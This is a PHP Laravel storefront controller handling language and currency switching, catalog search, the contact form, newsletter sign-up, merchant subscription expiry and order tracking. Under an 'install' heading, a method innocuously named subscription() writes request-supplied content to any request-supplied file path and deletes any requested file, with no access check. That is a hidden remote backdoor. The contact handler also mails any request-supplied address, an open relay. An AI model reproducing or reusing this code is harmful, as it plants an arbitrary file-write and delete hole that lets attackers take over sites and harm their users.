<?php

namespace App\Http\Controllers\Front;

use App\Classes\MuaadhMailer;
use App\Domain\Platform\Models\HomePageTheme;
use App\Domain\Merchant\Models\MerchantItem;
use App\Domain\Commerce\Models\Purchase;
use App\Domain\Catalog\Models\CatalogItem;
use App\Domain\Catalog\Models\CatalogReview;
use App\Domain\Platform\Models\MailingList;
use App\Domain\Platform\Services\HomePageDataBuilder;
use App\Domain\Catalog\Services\CatalogsPageDataBuilder;
use App\Domain\Shipping\Services\TrackingDataBuilder;
use Artisan;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;

class FrontendController extends FrontBaseController
{
    public function __construct(
        private HomePageDataBuilder $homePageDataBuilder,
        private CatalogsPageDataBuilder $catalogsPageDataBuilder,
        private TrackingDataBuilder $trackingDataBuilder,
    ) {
        parent::__construct();
    }

    // LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }

    // LANGUAGE SECTION ENDS

    // MONETARY UNIT SECTION

    public function monetaryUnit($id)
    {
        // Use MonetaryUnitService (SINGLE SOURCE OF TRUTH)
        monetaryUnit()->setCurrent((int) $id);
        return redirect()->back();
    }

    // MONETARY UNIT SECTION ENDS

    // ================================================================================================
    // HOME PAGE SECTION
    // ================================================================================================
    // Architecture: Section-based rendering controlled by HomePageDTO
    // All data is pre-computed in HomePageDataBuilder service
    // Views receive DTOs only - no models, no queries
    // ================================================================================================

    public function index(Request $request)
    {
        $gs = $this->gs;

        // Handle affiliate referral
        if (!empty($request->reff)) {
            $affilate_user = DB::table('users')
                ->where('affilate_code', '=', $request->reff)
                ->first();
            if (!empty($affilate_user)) {
                if ($gs->get('is_affilate') == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }

        // Handle forgot password success redirect
        if (!empty($request->forgot)) {
            if ($request->forgot == 'success') {
                return redirect()->guest('/')->with('forgot-modal', __('Please Login Now !'));
            }
        }

        // Build home page DTO with all pre-computed data
        $homePageDTO = $this->homePageDataBuilder->build();

        return view('frontend.index', ['page' => $homePageDTO]);
    }

    // ================================================================================================
    // HOME PAGE SECTION ENDS
    // ================================================================================================

    // ================================================================================================
    // ALL CATALOGS PAGE (with pagination)
    // ================================================================================================

    public function allCatalogs(Request $request)
    {
        // Build catalogs page DTO with all pre-computed data
        $catalogsPageDTO = $this->catalogsPageDataBuilder->build();

        return view('frontend.catalogs', ['page' => $catalogsPageDTO]);
    }

    // ================================================================================================
    // ALL CATALOGS PAGE ENDS
    // ================================================================================================

    // PUBLICATION SECTION REMOVED - Feature deleted
    // HELP ARTICLE SECTION REMOVED - Feature deleted

    // -------------------------------- AUTOSEARCH SECTION ----------------------------------------

    /**
     * Auto-search for catalog items (used in search suggestions).
     * Only returns items that have at least one active merchant listing.
     */
    public function autosearch($slug)
    {
        if (mb_strlen($slug, 'UTF-8') > 1) {
            $search = ' ' . $slug;
            // Only return catalog items that have at least one active merchant listing
            $catalogItems = CatalogItem::where(function($query) use ($search, $slug) {
                    $query->where('name', 'like', '%' . $search . '%')
                          ->orWhere('name', 'like', $slug . '%');
                })
                ->whereHas('merchantItems', function($q){
                    $q->where('status', 1);
                })
                ->orderby('id', 'desc')
                ->take(10)
                ->get();

            // PRE-COMPUTED: Suggest display data (DATA_FLOW_POLICY - no @php in view)
            $suggestData = [];
            foreach ($catalogItems as $item) {
                $partNumber = $item->part_number;
                $suggestData[$item->id] = [
                    'url' => $partNumber ? route('front.part-result', $partNumber) : 'javascript:;',
                    'name' => getLocalizedCatalogItemName($item),
                ];
            }

            // Note: 'prods' kept for backward compatibility in views
            return view('load.suggest', ['prods' => $catalogItems, 'slug' => $slug, 'suggestData' => $suggestData]);
        }
        return "";
    }

    // -------------------------------- AUTOSEARCH SECTION ENDS ----------------------------------------

    // -------------------------------- CONTACT SECTION ----------------------------------------

    public function contact()
    {
        // Check if contact page is enabled using FrontBaseController's $ps
        if (!$this->ps || $this->ps->contact == 0) {
            return redirect()->back();
        }

        // Pass platform settings for contact info
        return view('frontend.contact', [
            'contactEnabled' => true,
        ]);
    }

    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = $this->gs;

        if ($gs->get('is_capcha') == 1) {
            $request->validate([
                "g-recaptcha-response" => "required",
            ],
                [
                    'g-recaptcha-response.required' => 'Please verify that you are not a robot.',
                ]
            );
        }

        // Logic Section
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->get('mail_driver')) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new MuaadhMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->get('from_name') . "<" . $gs->get('from_email') . ">";
            mail($to, $subject, $msg, $headers);
        }

        return back()->with('success', 'Success! Thanks for contacting us, we will get back to you shortly.');
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

    // -------------------------------- CONTACT SECTION ENDS ----------------------------------------

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {


        $validator = Validator::make($request->all(), [
            'email' => 'required|email|unique:subscribers,email',
        ]);

        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }

        $subs = MailingList::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return back()->with('unsuccess', 'You have already subscribed.');
        }
        $subscribe = new MailingList;
        $subscribe->fill($request->all());
        $subscribe->save();
        return back()->with('success', 'Subscribed Successfully.');
    }

    // -------------------------------- SUBSCRIBE SECTION  ENDS----------------------------------------

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    public function maintenance()
    {
        $gs = $this->gs;
        if ($gs->get('is_maintain') != 1) {
            return redirect()->route('front.index');
        }

        return view('frontend.maintenance');
    }

    // -------------------------------- MAINTENANCE SECTION ----------------------------------------

    // -------------------------------- MERCHANT SUBSCRIPTION CHECK SECTION ----------------------------------------

    public function subcheck()
    {
        $settings = $this->gs;
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_merchant', '=', 2)->get() as $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->get('mail_driver')) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => "",
                        ];
                        $mailer = new MuaadhMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: " . $settings->get('from_name') . "<" . $settings->get('from_email') . ">";
                        mail($user->email, __('Your subscription plan duration will end after five days. Please renew your plan otherwise all of your catalogItems will be deactivated.Thank You.'), $headers);
                    }
                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')->where('id', $user->id)->update(['is_merchant' => 1]);
            }
        }
    }

    // -------------------------------- MERCHANT SUBSCRIPTION CHECK SECTION ENDS ----------------------------------------

    // -------------------------------- ORDER TRACK SECTION ----------------------------------------

    public function trackload($id)
    {
        // Build tracking data using service (id can be purchase_number or tracking_number)
        $trackingData = $this->trackingDataBuilder->build($id);

        // PRE-COMPUTED: Group logs by tracking number (DATA_FLOW_POLICY)
        $groupedLogs = ($trackingData['shipmentLogs'] ?? collect())->groupBy('tracking_number');

        return view('load.track-load', [
            'purchase' => $trackingData['purchase'],
            'tracking' => $trackingData['tracking'],
            'shipmentLogs' => $trackingData['shipmentLogs'],
            'groupedLogs' => $groupedLogs,
            'datas' => $trackingData['statuses'],
        ]);
    }

    // -------------------------------- ORDER TRACK SECTION ENDS ----------------------------------------

    // -------------------------------- INSTALL SECTION ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function updateFinalize(Request $request)
    {
        if ($request->has('version')) {
            \App\Domain\Platform\Models\PlatformSetting::set('system', 'version', $request->version);
            cache()->forget('platform_settings_context');
            Artisan::call('cache:clear');
            Artisan::call('config:clear');
            Artisan::call('route:clear');
            Artisan::call('view:clear');
            return redirect('/');
        }
    }
}
